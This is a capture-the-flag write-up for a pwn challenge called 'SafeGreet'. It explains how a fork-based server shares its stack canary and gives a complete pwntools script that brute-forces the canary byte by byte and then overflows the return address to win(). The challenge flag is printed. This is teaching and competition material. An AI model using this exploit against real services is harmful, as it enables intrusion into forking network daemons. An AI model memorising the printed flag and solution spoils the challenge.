# SafeGreet

| Field | Value |
|-------|-------|
| Category | Pwn |
| Points | 300 |

## Description

> This greeting service was hardened by the security team.
> They enabled a stack canary to prevent buffer overflows.
> But there's something odd about how the server handles connections...
>
> `nc <host> 4445`
>
> Attachment: `safegreet` (stripped binary)

## Solution

# SafeGreet — Writeup (Medium PWN / Canary Brute-Force)

## Challenge Overview

A stripped 64-bit TCP service greets you. It has a stack canary enabled.
The server is fork-based: each new connection forks the same parent process,
meaning every child shares the same canary value.

The goal: brute-force the 8-byte canary one byte at a time, then overflow
the return address to `win()`.

**Protections:**
| Protection | Status |
|------------|--------|
| Canary     | ✅ ON  |
| PIE        | ❌ OFF |
| NX         | ✅ ON  |
| RELRO      | Partial |
| Stripped   | ✅ YES |

---

## Step 1 — Reconnaissance

### Connect to the service

```
$ nc <host> 4445
=== SafeGreet v2 ===
Stack canary protection: ENABLED
Name: hello
Hello!
Goodbye!
```

### Checksec

```
$ checksec --file=safegreet
Canary: Yes   PIE: No   NX: Yes
```

### Strings analysis

```
$ strings safegreet
fork          ← fork-based server (key observation!)
flag.txt
Canary cracked! Flag:    ← win function exists
Name:
```

The `fork` symbol tells us the server forks for each connection.
Forking (not execing) means **every child inherits the parent's stack canary**.

---

## Step 2 — Reverse Engineering

Open in Ghidra or use `objdump -d safegreet`.

### Find win()

Search for `flag.txt` string cross-reference → function at `0x401226`.
It reads the flag file and prints it, then calls `exit(0)`.

### Find vuln()

The function called after the banner has:
```
sub $0x50, %rsp           ; allocates 80 bytes
mov %fs:0x28, %rax        ; load canary from thread-local storage
mov %rax, -0x8(%rbp)      ; store canary at RBP-0x08
...
lea -0x50(%rbp), %rax     ; buf address = RBP-0x50
mov $0x80, %edx           ; read 128 bytes  ← overflow!
call read@plt
...
mov -0x8(%rbp), %rax      ; check canary
sub %fs:0x28, %rax
je   .normal_return
call __stack_chk_fail      ; canary mismatch → abort
```

**Stack layout:**
```
RBP-0x50 → buf[64]      (64 bytes)
         → padding[8]   (8 bytes of alignment)
RBP-0x08 → canary[8]    ← 72 bytes from start of buf
RBP+0x00 → saved RBP    (8 bytes)
RBP+0x08 → saved RIP    (8 bytes)  ← target
```

**Offset to canary: 72 bytes**
**Offset to saved RIP: 88 bytes (after correct canary)**

---

## Step 3 — Canary Brute-Force Theory

On x86-64, the stack canary is:
- 8 bytes long
- Byte 0 (LSB) is **always 0x00** (prevents strcpy-based leaks)
- Bytes 1–7 are **random per process** (set once at startup, inherited on fork)

Since the server **forks** (not execs) for each connection, the canary is the
same in every child. We can recover it byte-by-byte:

```
For i in 0..7:
  canary[i] = 0x00  (for i=0)
  or:
  For b in 0x00..0xFF:
    Send: b'A'*72 + known_canary[:i] + bytes([b])
    If "Goodbye!" received → b is correct; break
    If connection drops → wrong byte (stack check failed)
```

Worst case: 1 + 7 × 256 = 1793 reconnections.

**Distinguishing correct vs wrong:**
- **Correct byte**: function completes normally → "Goodbye!\n" in response
- **Wrong byte**: `__stack_chk_fail` kills the child → connection drops silently

---

## Step 4 — Exploit Script

```python
from pwn import *
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = 4445

BUF_TO_CANARY = 72
WIN           = 0x401226   # from Ghidra/objdump (no PIE → fixed)

def try_byte(known: bytes, guess: int) -> bool:
    try:
        p = remote(HOST, PORT, timeout=3)
        p.recvuntil(b'Name: ', timeout=3)
        p.send(b'A' * BUF_TO_CANARY + known + bytes([guess]))
        resp = p.recvall(timeout=1.5)
        p.close()
        return b'Goodbye!' in resp
    except Exception:
        return False

# Phase 1: brute-force canary
canary = b'\x00'
for i in range(1, 8):
    for b in range(256):
        if try_byte(canary, b):
            canary += bytes([b])
            print(f"[+] canary[{i}] = 0x{b:02x}")
            break

print(f"[+] canary = {canary.hex()}")

# Phase 2: overflow to win()
p = remote(HOST, PORT)
p.recvuntil(b'Name: ')

payload  = b'A' * BUF_TO_CANARY   # fill to canary
payload += canary                   # correct canary (no stack check fail)
payload += b'B' * 8                # overwrite saved RBP
payload += p64(WIN)                 # overwrite saved RIP

p.send(payload)
print(p.recvall(timeout=3).decode())
```

---

## Step 5 — Run

```
$ python3 solve.py <host>
[+] canary[1] = 0x??
[+] canary[2] = 0x??
...
[+] canary[7] = 0x??
[+] canary = 00????????????????

Canary cracked! Flag: CHC{c4n4ry_br0k3n_0n3_byt3_4t_4_t1m3}
```

---

## Key Concepts Covered

- Stack canary fundamentals (placement, purpose, TLS storage)
- Why `fork()` breaks canary security (shared address space)
- Byte-by-byte oracle attack (256 guesses per byte)
- Distinguishing correct/wrong byte via server response ("Goodbye!" vs drop)
- Building final ROP payload with known canary

**Flag:** `CHC{c4n4ry_br0k3n_0n3_byt3_4t_4_t1m3}`

